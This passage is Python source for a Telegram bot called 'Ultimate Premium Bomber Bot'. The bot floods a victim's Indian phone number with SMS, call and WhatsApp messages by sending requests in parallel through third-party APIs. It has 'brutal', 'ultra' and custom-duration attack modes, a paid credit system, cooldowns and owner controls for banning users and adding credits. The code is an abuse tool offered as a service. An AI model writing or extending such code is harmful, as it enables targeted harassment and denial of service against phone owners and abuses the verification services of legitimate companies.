        "┃  🕐  " + bold('Last Active') + ": `" + last_active + "`\n"
        + decor3() + "\n\n"
        "📊  *" + bold('Your Statistics') + ":*\n"
        "┃  💎  " + bold('Credits') + ":   " + credits_display + "\n"
        "┃  💥  " + bold('Bombs') + ":     `" + str(db_user['total_bombs']) + "`\n"
        "┃  📤  " + bold('Requests') + ":  `" + str(db_user['total_requests']) + "`\n"
        "┃  ⭐  " + bold('Status') + ":    " + ('🚫 Banned' if db_user['is_banned'] else '✅ Active') + "\n"
        + decor3() + "\n\n"
        "👑  *" + bold('Access') + ":*  " + access
        + time_footer()
    )
    await update.message.reply_text(
        text, parse_mode=ParseMode.MARKDOWN,
        reply_markup=back_and_refresh("menu_profile")
    )


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id, user.username, user.first_name)
    user_id = user.id
    chat_id = update.effective_chat.id

    active = ("🟢  " + bold('RUNNING')) if chat_id in active_bombs else ("🔴  " + bold('IDLE'))
    uptime = time.time() - context.bot_data.get("start_time", time.time())
    h, m, s = int(uptime // 3600), int((uptime % 3600) // 60), int(uptime % 60)

    title = "🐾  " + bold('LIVE STATUS') + "  🐾"
    text = (
        hdr(title) + "\n\n"
        + decor4() + "\n"
        "┃  🤖  " + bold('Bot') + ":        🟢 " + bold('ONLINE') + "\n"
        "┃  ⚡  " + bold('Current') + ":    " + active + "\n"
        "┃  ⏱️  " + bold('Uptime') + ":     `" + str(h) + "h " + str(m) + "m " + str(s) + "s`\n"
        + decor4() + "\n\n"
        "🌍  *" + bold('Global Stats') + ":*\n"
        "┃  💥  " + bold('Bombs') + ":      `" + str(stats_global['total_bombs']) + "`\n"
        "┃  📤  " + bold('Requests') + ":   `" + str(stats_global['total_requests']) + "`\n"
        "┃  ✅  " + bold('Success') + ":    `" + str(stats_global['total_success']) + "`\n"
        + decor4() + "\n\n"
        "👤  " + bold('Your Usage') + ":  `" + str(len(user_history.get(user_id, []))) + "/" + str(BOMBS_PER_HOUR) + "`\n"
        "👥  " + bold('Active Bombs') + ": `" + str(len(active_bombs)) + "`"
        + time_footer()
    )
    await update.message.reply_text(
        text, parse_mode=ParseMode.MARKDOWN,
        reply_markup=back_and_refresh("menu_stats")
    )


async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id, user.username, user.first_name)

    title = "⛎  " + bold('ABOUT BOT') + "  ⛎"
    text = (
        hdr(title) + "\n\n"
        + decor() + "\n"
        "🔥  *" + bold('Ultimate Premium Bomber Bot') + "*\n"
        "┃  📦  " + bold('Version') + ":  `13.0`\n"
        "┃  ⚡  " + bold('Mode') + ":     `Full Access`\n"
        "┃  💎  " + bold('Credits') + ":  `6 Free (New)`\n"
        "┃  👑  " + bold('Owner') + ":    `Unlimited ∞`\n"
        "┃  🎵  " + bold('Audio') + ":    `Multi-Rotation`\n"
        + decor() + "\n\n"
        "🎯  *" + bold('Features') + ":*\n"
        "┃  ♾️  _" + italic('Unlimited bombs') + "_\n"
        "┃  🛑  _" + italic('Working stop button') + "_\n"
        "┃  📊  _" + italic('Live 3s progress') + "_\n"
        "┃  💀  _" + italic('Brutal + Ultra mode') + "_\n"
        "┃  🎯  _" + italic('Custom duration') + "_\n"
        "┃  🪙  _" + italic('Credit system') + "_\n"
        "┃  🎵  _" + italic('Multi-audio rotation') + "_\n"
        "┃  👥  _" + italic('Full user management') + "_\n"
        + decor() + "\n\n"
        "👨‍💻  *" + bold('Developer') + ":*  @" + ADMIN_USERNAME + "\n"
        "💬  *" + bold('Support') + ":*    @" + ADMIN_USERNAME
        + time_footer()
    )
    await update.message.reply_text(
        text, parse_mode=ParseMode.MARKDOWN, reply_markup=back_button()
    )


async def credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db_user = get_user(user.id, user.username, user.first_name)
    await update.message.reply_text(
        credits_menu_text(db_user),
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=back_button()
    )


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id, user.username, user.first_name)

    chat_id = update.effective_chat.id
    if chat_id in active_bombs:
        active_bombs[chat_id]["stop"].set()
        title = "🛑  " + bold('STOPPED') + "  🛑"
        await update.message.reply_text(
            hdr(title) + "\n\n"
            + decor() + "\n"
            "✅  *" + bold('Bombing stopped successfully') + "!*\n"
            + decor() + "\n\n"
            "💡  _" + italic('Ready for next attack') + "_"
            + time_footer(),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_button()
        )
    else:
        await update.message.reply_text(
            "❌  *" + bold('No active bombing') + ".*" + time_footer(),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_button()
        )


# ============================================================
# COOLDOWN
# ============================================================
async def show_cooldown(update, remaining):
    title = "⏳  " + bold('COOLDOWN') + "  ⏳"
    msg = await update.message.reply_text(
        hdr(title) + "\n\n"
        + decor2() + "\n"
        "🛑  *" + bold('Bombing on cooldown') + "!*\n"
        "┃  ⏱️  " + bold('Remaining') + ": `" + str(remaining) + "s`\n"
        + decor2() + "\n\n"
        "⏳  _" + italic('Please wait') + "..._",
        parse_mode=ParseMode.MARKDOWN
    )

    steps = max(1, remaining // 5)
    for _ in range(steps):
        await asyncio.sleep(5)
        remaining = max(0, remaining - 5)
        if remaining == 0:
            break
        try:
            bar_len = 15
            filled = int(bar_len * (1 - remaining / COOLDOWN_SECONDS))
            bar = "▰" * filled + "▱" * (bar_len - filled)

            await msg.edit_text(
                hdr(title) + "\n\n"
                + decor2() + "\n"
                "🛑  *" + bold('Bombing on cooldown') + "!*\n"
                "┃  ⏱️  " + bold('Remaining') + ": `" + str(remaining) + "s`\n"
                "┃  📊  " + bold('Progress') + ":  " + bar + "\n"
                + decor2() + "\n\n"
                "⏳  _" + italic('Please wait') + "..._",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            break

    try:
        ready_title = "✅  " + bold('READY') + "  ✅"
        await msg.edit_text(
            hdr(ready_title) + "\n\n"
            + decor() + "\n"
            "🔥  *" + bold('Cooldown complete') + "!*\n"
            "┃  🎯  " + bold('Ready for next bomb') + "\n"
            + decor() + "\n\n"
            "💡  *" + italic('Choose your attack') + "!*  👇",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu()
        )
    except Exception:
        pass


# ============================================================
# CREDIT EXHAUST
# ============================================================
async def send_credit_exhausted(update, credits):
    title = "❌  " + bold('CREDITS KHATAM') + "  ❌"
    text = (
        hdr(title) + "\n\n"
        + decor() + "\n"
        "🚫  *" + bold('Aapka credit khatam ho gaya') + "!*\n"
        "┃\n"
        "💎  " + bold('Credits Left') + ":  `" + str(credits) + "`\n"
        "🎁  " + bold('Required') + ":     `" + str(CREDIT_PER_BOMB) + "` credit\n"
        "📛  " + bold('Reason') + ":       No credits available\n"
        + decor() + "\n\n"
        "📞  *" + bold('Bot owner se contact karein') + "*\n"
        "💬  _" + italic('Neeche button press karo') + "_\n\n"
        "👑  *" + bold('Support') + ":*  @" + ADMIN_USERNAME + "\n\n"
        "⚠️  _" + italic('Credit khatam par koi bhi command use karo toh yahi message aayega') + "_"
        + time_footer()
    )
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=contact_owner_kb()
    )


# ============================================================
# BOMB RUNNER
# ============================================================
async def run_bomb(update, context, api_list, bomb_type, mode="normal", duration_override=None):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    db_user = get_user(user_id)
    is_owner_user = is_owner(user_id)

    if db_user["is_banned"]:
        await notify_banned(context.bot, user_id)
        return

    if not is_owner_user and db_user["credits"] < CREDIT_PER_BOMB:
        await send_credit_exhausted(update, db_user["credits"])
        return

    allowed, remaining = check_cooldown(user_id)
    if not allowed:
        await show_cooldown(update, remaining)
        return

    if chat_id in active_bombs:
        warn_title = "⚠️  " + bold('WARNING') + "  ⚠️"
        await update.message.reply_text(
            hdr(warn_title) + "\n\n"
            "🛑  *" + bold('Aapka pehle se ek bomb running hai') + "!*\n"
            "_" + italic('Please wait or press /stop') + "_",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if not context.args:
        await update.message.reply_text(
            "❌  *" + bold('Usage') + ":*  `/" + bomb_type + " <number>`\n"
            "📱  *" + bold('Example') + ":*  `/" + bomb_type + " 9876543210`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    phone = clean_number(context.args[0])
    if not validate_number(phone):
        await update.message.reply_text(
            "❌  *" + bold('Invalid number') + "!*\n"
            "📱  _" + italic('10 digits daalein') + "_",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    allowed, msg = check_rate_limit(user_id)
    if not allowed:
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
        return

    user_history[user_id].append(time.time())

    if not is_owner_user:
        deduct_credit(user_id)

    if duration_override:
        duration = duration_override
        threads = ULTRA_THREADS
        delay = ULTRA_DELAY
    elif mode == "ultra":
        duration, threads, delay = ULTRA_DURATION, ULTRA_THREADS, ULTRA_DELAY
    elif mode == "brutal":
        duration, threads, delay = BRUTAL_DURATION, BRUTAL_THREADS, BRUTAL_DELAY
    else:
        duration, threads, delay = NORMAL_DURATION, NORMAL_THREADS, NORMAL_DELAY

    stop_event = asyncio.Event()
    active_bombs[chat_id] = {
        "stop": stop_event, "type": bomb_type,
        "phone": phone, "start": time.time()
    }

    titles = {
        "sms": "💱  " + bold('SMS ATTACK'),
        "call": "♓  " + bold('CALL ATTACK'),
        "whatsapp": "📟  " + bold('WHATSAPP ATTACK'),
        "all": "☎  " + bold('ALL API ATTACK'),
        "brutal": "🦍  " + bold('BRUTAL ATTACK'),
        "ultra": "🦖  " + bold('ULTRA ATTACK'),
        "custom": "🚸  " + bold('CUSTOM ATTACK'),
    }
    title = titles.get(bomb_type, "🔥  " + bold('ATTACK'))

    credit_line = "`-1` (Cost)" if not is_owner_user else "`∞  OWNER`"

    # ============ PREMIUM ANIMATION ============
    anim_msg = await update.message.reply_text("⏳")

    frames = [
        "🔍  𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴  𝘁𝗮𝗿𝗴𝗲𝘁  ...",
        "📡  𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴  𝘁𝗼  𝗔𝗣𝗜𝘀  ...",
        "🎯  𝗟𝗼𝗰𝗸𝗶𝗻𝗴  𝗻𝘂𝗺𝗯𝗲𝗿  ...",
        "⚙️  𝗣𝗿𝗲𝗽𝗮𝗿𝗶𝗻𝗴  𝗮𝘁𝘁𝗮𝗰𝗸  ...",
        "🧬  𝗟𝗼𝗮𝗱𝗶𝗻𝗴  𝘄𝗲𝗮𝗽𝗼𝗻𝘀  ...",
        "⚡  𝗔𝗿𝗺𝗶𝗻𝗴  𝘀𝘆𝘀𝘁𝗲𝗺  ...",
        "🚀  𝗜𝗻𝗶𝘁𝗶𝗮𝗹𝗶𝘇𝗶𝗻𝗴  𝗮𝘁𝘁𝗮𝗰𝗸  ...",
        "💥  𝗟𝗮𝘂𝗻𝗰𝗵𝗶𝗻𝗴  𝗮𝘁𝘁𝗮𝗰𝗸  !!!",
    ]

    for i, frame in enumerate(frames):
        try:
            bar_count = i + 1
            bar = "▰" * bar_count + "▱" * (8 - bar_count)
            anim_text = (
                hdr("🚀  " + bold("PREPARING ATTACK") + "  🚀") + "\n\n"
                + decor() + "\n"
                "┃  " + frame + "\n"
                "┃  " + bar + "  `" + str(int((i+1)/len(frames)*100)) + "%`\n"
                + decor() + "\n\n"
                "🎯  " + bold('Target') + ":  `+91" + phone + "`\n"
                "🔰  " + bold('Mode') + ":    " + title + "\n"
                "⏱️  " + bold('Duration') + ": `" + str(duration) + "s`\n"
                "🧵  " + bold('Threads') + ":  `" + str(threads) + "`\n"
                "💎  " + bold('Credit') + ":   " + credit_line + "\n\n"
                + bomb_art() + "\n\n"
                "🕐  `" + current_time() + "`"
            )
            await anim_msg.edit_text(anim_text, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            logger.debug(f"Animation frame {i}: {e}")
        await asyncio.sleep(0.4)

    try:
        await anim_msg.delete()
    except Exception:
        pass

    # ============ MAIN MESSAGE ============
    start_text = (
        hdr(title) + "\n\n"
        + decor() + "\n"
        "┃  🎯  " + bold('Target') + ":    `+91" + phone + "`\n"
        "┃  ⏱️  " + bold('Duration') + ":  `" + str(duration) + "s`\n"
        "┃  🧵  " + bold('Threads') + ":   `" + str(threads) + "`\n"
        "┃  💎  " + bold('Credit') + ":    " + credit_line + "\n"
        + decor() + "\n\n"
        + music_player("🔥  " + bold('Attack Started')) + "\n\n"
        "⚡  _" + italic('Bombing in progress') + "..._\n\n"
        "🛑  _" + italic('Press STOP to cancel') + "_\n"
        "🕐  " + bold('IST') + ": `" + current_time() + "`"
    )

    msg_obj = await update.message.reply_text(
        start_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=stop_button(chat_id)
    )

    audio_msg = None
    audio_file_id = get_next_audio()
    if audio_file_id:
        try:
            audio_msg = await update.message.reply_audio(
                audio=audio_file_id,
                caption=(
                    "🎧  *" + bold('BOMBING AUDIO') + "*\n"
                    "┃  🎯  " + bold('Target') + ":  `+91" + phone + "`\n"
                    "┃  🔰  " + bold('Mode') + ":    " + title + "\n"
                    "┃  🕐  " + bold('Time') + ":    `" + current_time() + "`"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.debug(f"Audio send: {e}")

    last_edit = [0]

    async def progress(total, success, failed, elapsed, remaining):
        now = time.time()
        if now - last_edit[0] < PROGRESS_UPDATE_INTERVAL:
            return
        last_edit[0] = now

        try:
            rate = int(total / elapsed) if elapsed > 0 else 0
            percent = int(elapsed / duration * 100) if duration > 0 else 0
            bar = progress_bar(percent)

            live_title = "🔥  " + bold('BOMBING LIVE') + "  🔥"
            live_text = (
                hdr(live_title) + "\n\n"
                + decor() + "\n"
                "┃  🎯  " + bold('Target') + ":    `+91" + phone + "`\n"
                "┃  🔰  " + bold('Mode') + ":      " + title + "\n"
                + div() + "\n"
                "┃  ⏱️  " + bold('Time') + ":      `" + str(elapsed) + "s` / `" + str(duration) + "s`\n"
                "┃  📊  " + bold('Progress') + ":  " + bar + " `" + str(percent) + "%`\n"
                + div() + "\n\n"
                "📤  " + bold('Messages Sent') + ":  `" + str(total) + "`\n"
                "✅  " + bold('Success') + ":        `" + str(success) + "`\n"
                "❌  " + bold('Failed') + ":         `" + str(failed) + "`\n"
                "⚡  " + bold('Rate') + ":           `" + str(rate) + " msg/s`\n"
                "⏳  " + bold('Remaining') + ":      `" + str(remaining) + "s`\n\n"
                + bomb_art() + "\n\n"
                + music_player("🎧  " + bold('Live') + " — " + bold(str(total)) + " msgs") + "\n\n"
                "🛑  _" + italic('Press STOP to cancel') + "_\n"
                "🕐  " + bold('IST') + ": `" + current_time() + "`"
            )
            await msg_obj.edit_text(
                live_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=stop_button(chat_id)
            )
        except Exception as e:
            logger.debug(f"Progress edit: {e}")

    total = success = failed = 0
    try:
        total, success, failed = await execute_bomb(
            phone, api_list, stop_event, duration, threads, delay, progress
        )
    except Exception as e:
        logger.error(f"Bomb error: {e}")

    stats_global["total_bombs"] += 1
    stats_global["total_requests"] += total
    stats_global["total_success"] += success

    update_user(
        user_id,
        total_bombs=db_user["total_bombs"] + 1,
        total_requests=db_user["total_requests"] + total,
        last_bomb_time=time.time()
    )

    active_bombs.pop(chat_id, None)
    stopped = stop_event.is_set()

    status = ("🛑  " + bold('STOPPED')) if stopped else ("✅  " + bold('COMPLETED'))

    if is_owner_user:
        credits_left_line = "🪙  *" + bold('Credits Left') + ":*  `∞  (Owner)`"
    else:
        credits_left_line = "🪙  *" + bold('Credits Left') + ":*  `" + str(db_user['credits'] - CREDIT_PER_BOMB) + "`"

    end_title = "🏁  " + bold('ATTACK END') + "  🏁"
    try:
        end_text = (
            hdr(end_title) + "\n\n"
            + decor2() + "\n"
            "┃  " + bold('Status') + ":   " + status + "\n"
            "┃  " + bold('Target') + ":   `+91" + phone + "`\n"
            "┃  " + bold('Mode') + ":     " + title + "\n"
            + decor2() + "\n\n"
            "📊  *" + bold('Final Results') + ":*\n"
            "┃  📤  " + bold('Total Sent') + ":   `" + str(total) + "`\n"
            "┃  ✅  " + bold('Success') + ":       `" + str(success) + "`\n"
            "┃  ❌  " + bold('Failed') + ":        `" + str(failed) + "`\n"
            "┃  📈  " + bold('Success Rate') + ":  `" + str(int(success / total * 100) if total else 0) + "%`\n"
            + decor2() + "\n\n"
            + credits_left_line + "\n"
            + div() + "\n"
            "⏳  *" + bold('Cooldown') + ": " + str(COOLDOWN_SECONDS) + "s*"
            + time_footer()
        )
        await msg_obj.edit_text(
            end_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_button()
        )
    except Exception as e:
        logger.debug(f"Final edit: {e}")

    if audio_msg:
        try:
            await asyncio.sleep(5)
            await audio_msg.delete()
        except Exception:
            pass


# ============================================================
# BOMB COMMANDS
# ============================================================
async def sms_cmd(update, context):
    await run_bomb(update, context, SMS_APIS, "sms")

async def call_cmd(update, context):
    await run_bomb(update, context, CALL_APIS, "call")

async def whatsapp_cmd(update, context):
    await run_bomb(update, context, WHATSAPP_APIS, "whatsapp")

async def all_cmd(update, context):
    await run_bomb(update, context, SMS_APIS + CALL_APIS + WHATSAPP_APIS, "all")

async def brutal_cmd(update, context):
    combined = SMS_APIS + CALL_APIS + WHATSAPP_APIS
    await run_bomb(update, context, combined, "brutal", mode="brutal")

async def ultra_cmd(update, context):
    combined = SMS_APIS + CALL_APIS + WHATSAPP_APIS
    await run_bomb(update, context, combined, "ultra", mode="ultra")


async def custom_cmd(update, context):
    if len(context.args) < 2:
        title = "🚸  " + bold('CUSTOM') + "  🚸"
        await update.message.reply_text(
            hdr(title) + "\n\n"
            "❌  *" + bold('Usage') + ":*  `/custom <number> <seconds>`\n"
            "📱  *" + bold('Example') + ":*  `/custom 9876543210 120`\n\n"
            "⏱️  *" + bold('Seconds') + ": 10 - 900*",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    phone = context.args[0]
    try:
        sec = int(context.args[1])
        if sec < 10 or sec > 900:
            await update.message.reply_text("❌  *" + bold('Seconds 10-900') + "*")
            return
    except ValueError:
        await update.message.reply_text("❌  *" + bold('Invalid seconds') + "!*")
        return

    context.args = [phone]
    combined = SMS_APIS + CALL_APIS + WHATSAPP_APIS
    await run_bomb(update, context, combined, "custom", mode="ultra", duration_override=sec)


# ============================================================
# OWNER COMMANDS
# ============================================================
async def addcredit_cmd(update, context):
    if not is_owner(update.effective_user.id):
        return

    if len(context.args) < 2:
        await update.message.reply_text(
            "👑  *" + bold('OWNER COMMAND') + "*\n\n"
            "📝  *" + bold('Usage') + ":*  `/addcredit <user_id> <amount>`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌  *Invalid arguments*")
        return

    get_user(target_id)
    add_credit(target_id, amount)
    user = get_user(target_id)

    await update.message.reply_text(
        "✅  *" + bold('Credits Added') + "!*\n\n"
        "┃  👤  " + bold('User') + ":  `" + str(target_id) + "`\n"
        "┃  ➕  " + bold('Added') + ":  `" + str(amount) + "`\n"
        "┃  💎  " + bold('Total') + ":  `" + str(user['credits']) + "`",
        parse_mode=ParseMode.MARKDOWN
    )

    await notify_credits_added(context.bot, target_id, amount, user["credits"])


async def removecredit_cmd(update, context):
    if not is_owner(update.effective_user.id):
        return

    if len(context.args) < 2:
        await update.message.reply_text(
            "📝  *" + bold('Usage') + ":*  `/removecredit <user_id> <amount>`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌  *Invalid arguments*")
        return

    get_user(target_id)
    remove_credit(target_id, amount)
    user = get_user(target_id)

    await update.message.reply_text(
        "✅  *" + bold('Credits Removed') + "!*\n"
        "┃  👤  `" + str(target_id) + "`\n"
        "┃  ➖  `" + str(amount) + "`\n"
        "┃  💎  `" + str(user['credits']) + "`",
        parse_mode=ParseMode.MARKDOWN
    )

    await notify_credits_removed(context.bot, target_id, amount, user["credits"])


async def ban_cmd(update, context):
    if not is_owner(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text("📝  *Usage:*  `/ban <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌  *Invalid user ID*")
        return

    get_user(target_id)
    update_user(target_id, is_banned=1)

    await update.message.reply_text(
        "🚫  *" + bold('USER BANNED') + "!*\n┃  👤  `" + str(target_id) + "`",
        parse_mode=ParseMode.MARKDOWN
    )

    await notify_banned(context.bot, target_id)


async def unban_cmd(update, context):
    if not is_owner(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text("📝  *Usage:*  `/unban <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌  *Invalid user ID*")
        return

    get_user(target_id)
    update_user(target_id, is_banned=0)

    await update.message.reply_text(
        "✅  *" + bold('USER UNBANNED') + "!*\n┃  👤  `" + str(target_id) + "`",
        parse_mode=ParseMode.MARKDOWN
    )

    await notify_unbanned(context.bot, target_id)


async def addaudio_cmd(update, context):
    if not is_owner(update.effective_user.id):
        return

    replied = update.message.reply_to_message
    if not replied:
        await update.message.reply_text(
            "👑  *" + bold('ADD AUDIO') + "*\n\n"
            "📝  _" + italic('Reply to an audio/voice with /addaudio') + "_",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    file_id = None
    if replied.audio:
        file_id = replied.audio.file_id
    elif replied.voice:
        file_id = replied.voice.file_id
    elif replied.document and replied.document.mime_type and replied.document.mime_type.startswith("audio"):
        file_id = replied.document.file_id

    if not file_id:
        await update.message.reply_text("❌  *" + bold('Not an audio file') + "!*", parse_mode=ParseMode.MARKDOWN)
        return

    added, total = add_audio(file_id)
    if added:
        await update.message.reply_text(
            "✅  *" + bold('AUDIO SAVED') + "!*\n\n"
            "┃  🎵  " + bold('Total Audios') + ":  `" + str(total) + "`\n"
            "┃  🔄  _" + italic('Rotation: 1 → 2 → 3 → 1') + "_\n"
            "┃  🎧  _" + italic('Har bombing par next audio aayega') + "_",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text(
            "⚠️  *" + bold('Audio already saved') + "!*\n"
            "┃  📊  " + bold('Total') + ":  `" + str(total) + "`",
            parse_mode=ParseMode.MARKDOWN
        )


async def users_cmd(update, context):
    if not is_admin(update.effective_user.id):
        return
    total = db_execute("SELECT COUNT(*) FROM users", fetch="one")[0]
    banned = db_execute("SELECT COUNT(*) FROM users WHERE is_banned = 1", fetch="one")[0]
    audios_count = len(load_audios())
    await update.message.reply_text(
        "👥  *" + bold('USERS') + ":*  `" + str(total) + "`\n"
        "🚫  *" + bold('BANNED') + ":*  `" + str(banned) + "`\n"
        "⚡  *" + bold('ACTIVE') + ":*  `" + str(len(active_bombs)) + "`\n"
        "💥  *" + bold('BOMBS') + ":*  `" + str(stats_global['total_bombs']) + "`\n"
        "📤  *" + bold('REQUESTS') + ":*  `" + str(stats_global['total_requests']) + "`\n"
        "🎵  *" + bold('AUDIOS') + ":*  `" + str(audios_count) + "`",
        parse_mode=ParseMode.MARKDOWN
    )


async def broadcast_cmd(update, context):
    if not is_owner(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text(
            "📝  *" + bold('Usage') + ":*  `/broadcast <message>`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    message = " ".join(context.args)
    users = db_execute("SELECT user_id FROM users", fetch="all") or []
    sent = 0
    failed = 0
    for u in users:
        try:
            await context.bot.send_message(
                chat_id=u[0],
                text="📢  *" + bold('BROADCAST') + "*\n\n" + message + "\n\n👑 @" + ADMIN_USERNAME,
                parse_mode=ParseMode.MARKDOWN
            )
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1
    await update.message.reply_text(
        "✅  *" + bold('Broadcast Complete') + "!*\n"
        "┃  ✅  Sent:  `" + str(sent) + "`\n"
        "┃  ❌  Failed: `" + str(failed) + "`",
        parse_mode=ParseMode.MARKDOWN
    )


# ============================================================
# CALLBACK HANDLER
# ============================================================
async def button_handler(update, context):
    q = update.callback_query
    try:
        await q.answer()
    except Exception:
        pass

    d = q.data
    user_id = q.from_user.id
    chat_id = q.message.chat_id

    if not is_owner(user_id):
        try:
            get_user(user_id, q.from_user.username, q.from_user.first_name)
        except Exception:
            pass

    # STOP
    if d.startswith("stop_"):
        target_chat = int(d.split("_", 1)[1])
        if target_chat in active_bombs:
            active_bombs[target_chat]["stop"].set()
            title = "🛑  " + bold('STOPPED') + "  🛑"
            try:
                await q.edit_message_text(
                    hdr(title) + "\n\n"
                    + decor4() + "\n"
                    "✅  *" + bold('Bombing stopped successfully') + "!*\n"
                    + decor4() + "\n\n"
                    "💡  *" + italic('Ready for next attack') + "!*"
                    + time_footer(),
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=back_button()
                )
            except Exception:
                pass
        else:
            try:
                await q.edit_message_text(
                    "❌  *" + bold('Already stopped') + "!*",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass
        return

    # ENTER NUMBER
    if d.startswith("enter_"):
        bomb_type = d.split("_", 1)[1]

        db_u = get_user(user_id)
        if not is_owner(user_id) and db_u["credits"] < CREDIT_PER_BOMB:
            try:
                title = "❌  " + bold('CREDITS KHATAM') + "  ❌"
                await q.edit_message_text(
                    hdr(title) + "\n\n"
                    + decor() + "\n"
                    "🚫  *" + bold('Aapka credit khatam ho gaya') + "!*\n"
                    "┃\n"
                    "💎  " + bold('Credits Left') + ":  `" + str(db_u['credits']) + "`\n"
                    "🎁  " + bold('Required') + ":     `" + str(CREDIT_PER_BOMB) + "` credit\n"
                    + decor() + "\n\n"
                    "📞  *" + bold('Bot owner se contact karein') + "*\n\n"
                    "👑  " + bold('Support') + ":  @" + ADMIN_USERNAME
                    + time_footer(),
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=contact_owner_kb()
                )
            except Exception:
                pass
            return

        user_states[user_id] = {"action": "waiting_number", "type": bomb_type}
        title = "🎯  " + bold('ENTER NUMBER') + "  🎯"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor3() + "\n"
                "📱  *" + bold('Send 10-digit number') + "*\n"
                "┃  " + bold('Type') + ":  `" + bomb_type.upper() + "`\n"
                + decor3() + "\n\n"
                "✅  *" + bold('Example') + ":*  `9876543210`\n\n"
                "💬  *" + italic('Send number now') + "...*"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_button()
            )
        except Exception:
            pass
        return

    # MENUS
    if d == "menu_sms":
        try:
            await q.edit_message_text(sms_menu_text(), parse_mode=ParseMode.MARKDOWN, reply_markup=back_and_bomb("sms"))
        except Exception as e:
            logger.debug(f"menu_sms: {e}")

    elif d == "menu_call":
        try:
            await q.edit_message_text(call_menu_text(), parse_mode=ParseMode.MARKDOWN, reply_markup=back_and_bomb("call"))
        except Exception as e:
            logger.debug(f"menu_call: {e}")

    elif d == "menu_wa":
        try:
            await q.edit_message_text(wa_menu_text(), parse_mode=ParseMode.MARKDOWN, reply_markup=back_and_bomb("whatsapp"))
        except Exception as e:
            logger.debug(f"menu_wa: {e}")

    elif d == "menu_all":
        try:
            await q.edit_message_text(all_menu_text(), parse_mode=ParseMode.MARKDOWN, reply_markup=back_and_bomb("all"))
        except Exception as e:
            logger.debug(f"menu_all: {e}")

    elif d == "menu_brutal":
        try:
            await q.edit_message_text(brutal_menu_text(), parse_mode=ParseMode.MARKDOWN, reply_markup=back_and_bomb("brutal"))
        except Exception as e:
            logger.debug(f"menu_brutal: {e}")

    elif d == "menu_ultra":
        try:
            await q.edit_message_text(ultra_menu_text(), parse_mode=ParseMode.MARKDOWN, reply_markup=back_and_bomb("ultra"))
        except Exception as e:
            logger.debug(f"menu_ultra: {e}")

    elif d == "menu_custom":
        try:
            await q.edit_message_text(custom_menu_text(), parse_mode=ParseMode.MARKDOWN, reply_markup=custom_menu_kb())
        except Exception as e:
            logger.debug(f"menu_custom: {e}")

    elif d == "menu_credits":
        db_user = get_user(user_id)
        try:
            await q.edit_message_text(
                credits_menu_text(db_user),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_button()
            )
        except Exception as e:
            logger.debug(f"menu_credits: {e}")

    # PROFILE
    elif d == "menu_profile":
        user = q.from_user
        db_user = get_user(user.id, user.username, user.first_name)
        joined = db_user["joined_at"][:10] if db_user["joined_at"] else "N/A"
        last_active = db_user["last_active"][:16] if db_user.get("last_active") else "N/A"

        if is_owner(user.id):
            credits_display = "∞  (Unlimited 👑)"
            access = "👑 OWNER"
        else:
            credits_display = "`" + str(db_user['credits']) + "`"
            access = "💎 FULL ACCESS"

        title = "🔆  " + bold('YOUR PROFILE') + "  🔆"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor3() + "\n"
                "┃  👤  " + bold('Name') + ":      `" + user.first_name + "`\n"
                "┃  🆔  " + bold('User ID') + ":   `" + str(user.id) + "`\n"
                "┃  📛  " + bold('Username') + ":  @" + (user.username or 'N/A') + "\n"
                "┃  📅  " + bold('Joined') + ":    `" + joined + "`\n"
                "┃  🕐  " + bold('Last Active') + ": `" + last_active + "`\n"
                + decor3() + "\n\n"
                "📊  *" + bold('Your Statistics') + ":*\n"
                "┃  💎  " + bold('Credits') + ":   " + credits_display + "\n"
